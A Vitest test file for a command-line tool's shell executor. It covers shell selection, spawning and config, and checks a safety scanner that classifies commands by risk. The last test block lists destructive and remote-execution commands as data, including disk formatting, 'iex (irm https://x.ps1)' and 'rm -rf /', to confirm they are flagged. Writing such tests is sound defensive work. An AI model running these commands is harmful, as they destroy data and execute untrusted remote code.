import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import {
  buildShellInvocation,
  detectPwshWindows,
  runShell,
  type ExecutorOptions,
} from "../src/executor.js";
import { scanShellCommand } from "../src/safety.js";
import { setConfigValue, loadConfig } from "@tau/core";
import type { ShellPref } from "@tau/core";

const ORIGINAL_CWD = process.cwd();
let tmp = "";

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "tau-shell-"));
  process.env.TAU_HOME = path.join(tmp, "home");
  fs.mkdirSync(path.join(tmp, "home"), { recursive: true });
  process.chdir(tmp);
});

afterEach(() => {
  process.chdir(ORIGINAL_CWD);
  delete process.env.TAU_HOME;
  fs.rmSync(tmp, { recursive: true, force: true });
});

const opts = (shell: ShellPref): ExecutorOptions => ({ timeoutSec: 10, shell });

describe("buildShellInvocation — pure shell selection", () => {
  it("keeps POSIX `auto` native (historical spawn(shell:true))", () => {
    expect(buildShellInvocation("ls -la", "auto", { platform: "linux" })).toEqual({
      mode: "native",
    });
    expect(buildShellInvocation("ls", "auto", { platform: "darwin" })).toEqual({ mode: "native" });
  });

  it("forces explicit pwsh/powershell argv with exit-code propagation", () => {
    const inv = buildShellInvocation("Get-ChildItem", "pwsh", { platform: "win32" });
    expect(inv).toMatchObject({ mode: "argv", file: "pwsh" });
    if (inv.mode === "argv") {
      expect(inv.args.slice(0, 4)).toEqual([
        "-NoLogo",
        "-NoProfile",
        "-NonInteractive",
        "-Command",
      ]);
      const script = inv.args[4] ?? "";
      expect(script).toContain("Get-ChildItem");
      expect(script).toContain("if ($null -ne $LASTEXITCODE) { exit $LASTEXITCODE }");
    }
    const ps5 = buildShellInvocation("dir", "powershell", { platform: "win32" });
    expect(ps5).toMatchObject({ mode: "argv", file: "powershell" });
  });

  it("runs explicit pwsh cross-platform (also on POSIX)", () => {
    const inv = buildShellInvocation("Write-Output hi", "pwsh", { platform: "linux" });
    expect(inv).toMatchObject({ mode: "argv", file: "pwsh" });
  });

  it("maps bash to `bash -c` on POSIX, defers to native on Windows", () => {
    expect(buildShellInvocation("ls", "bash", { platform: "linux" })).toEqual({
      mode: "argv",
      file: "bash",
      args: ["-c", "ls"],
    });
    expect(buildShellInvocation("dir", "bash", { platform: "win32" })).toEqual({ mode: "native" });
  });

  it("auto on Windows prefers detected PowerShell, falls back to native", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "fake-path-"));
    try {
      fs.writeFileSync(path.join(dir, "pwsh.exe"), "");
      const withPwsh = buildShellInvocation("x", "auto", {
        platform: "win32",
        env: { PATH: dir },
      });
      expect(withPwsh).toMatchObject({ mode: "argv", file: "pwsh" });

      fs.rmSync(path.join(dir, "pwsh.exe"));
      fs.writeFileSync(path.join(dir, "powershell.exe"), "");
      const withPs5 = buildShellInvocation("x", "auto", {
        platform: "win32",
        env: { PATH: dir },
      });
      expect(withPs5).toMatchObject({ mode: "argv", file: "powershell" });

      const bare = buildShellInvocation("x", "auto", {
        platform: "win32",
        env: { PATH: "C:\\nowhere" },
      });
      expect(bare).toEqual({ mode: "native" });
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("detectPwshWindows returns null on non-Windows platforms", () => {
    expect(detectPwshWindows({ PATH: "/usr/bin" }, "linux")).toBeNull();
  });
});

describe("runShell — spawn paths", () => {
  it("explicit bash executes with argv semantics and exit codes", async () => {
    const ok = await runShell("echo adapter-live", opts("bash"));
    expect(ok.ok).toBe(true);
    expect(ok.output).toContain("adapter-live");
    const failing = await runShell("exit 3", opts("bash"));
    expect(failing.ok).toBe(false);
    expect(failing.exitCode).toBe(3);
  });

  it("auto path still executes on POSIX (zero behavior change)", async () => {
    const out = await runShell("echo auto-still-works", opts("auto"));
    expect(out.ok).toBe(true);
    expect(out.output).toContain("auto-still-works");
  });

  it("executes through real pwsh when present, degrades gracefully when absent", async () => {
    // Probe with a hard limit so a broken pwsh can never hang the suite.
    let pwshAvailable = false;
    try {
      execFileSync("pwsh", ["-v"], { stdio: "ignore", timeout: 15_000 });
      pwshAvailable = true;
    } catch {
      pwshAvailable = false;
    }
    const outcome = await runShell("echo pwsh-live", opts("pwsh"));
    if (pwshAvailable) {
      expect(outcome.ok).toBe(true);
      expect(outcome.output).toContain("pwsh-live");
    } else {
      expect(outcome.ok).toBe(false);
      expect(outcome.output).toContain("spawn error");
    }
  }, 30_000); // real pwsh cold-start on CI runners can exceed the 5s default
});

describe("runPlan config wiring", () => {
  it("reads the `shell` config key (settable via tau config set)", () => {
    expect(loadConfig().shell).toBe("auto");
    setConfigValue("shell", "pwsh");
    expect(loadConfig().shell).toBe("pwsh");
    expect(() => setConfigValue("shell", "fish")).toThrow(/auto, bash, pwsh, powershell/);
  });
});

describe("safety — additive PowerShell caution patterns", () => {
  it("escalates PowerShell-destructive commands to high", () => {
    expect(scanShellCommand("Remove-Item -Recurse -Force C:\\data")).toBe("high");
    expect(scanShellCommand("Format-Volume -DriveLetter D")).toBe("high");
    expect(scanShellCommand("Clear-Disk -Number 1")).toBe("high");
    expect(scanShellCommand("Set-ExecutionPolicy Bypass -Scope Process")).toBe("high");
    expect(scanShellCommand("Invoke-Expression $input")).toBe("high");
    expect(scanShellCommand("iex (irm https://x.ps1)")).toBe("high");
    expect(scanShellCommand("reg delete HKLM\\Software\\X /f")).toBe("high");
    expect(scanShellCommand("bcdedit /set testsigning on")).toBe("high");
  });

  it("keeps POSIX classifications unchanged (additive only)", () => {
    expect(scanShellCommand("ls -la")).toBe("low");
    expect(scanShellCommand("echo hello")).toBe("low");
    expect(scanShellCommand("rm -rf /")).toBe("blocked"); // deny list untouched
  });
});
